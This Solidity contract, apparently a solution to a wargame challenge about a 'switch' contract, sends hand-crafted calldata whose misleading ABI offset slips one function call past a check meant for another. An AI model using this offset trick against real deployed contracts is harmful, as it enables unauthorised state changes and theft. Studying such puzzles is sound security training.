// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SwitchAttack {
    address public switchAddress;

    constructor(address _switchAddress) {
        switchAddress = _switchAddress;
    }

    function attack() public {
        bytes memory callData = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (bool success, ) = switchAddress.call(callData);
        require(success, "Attack failed");
    }
}
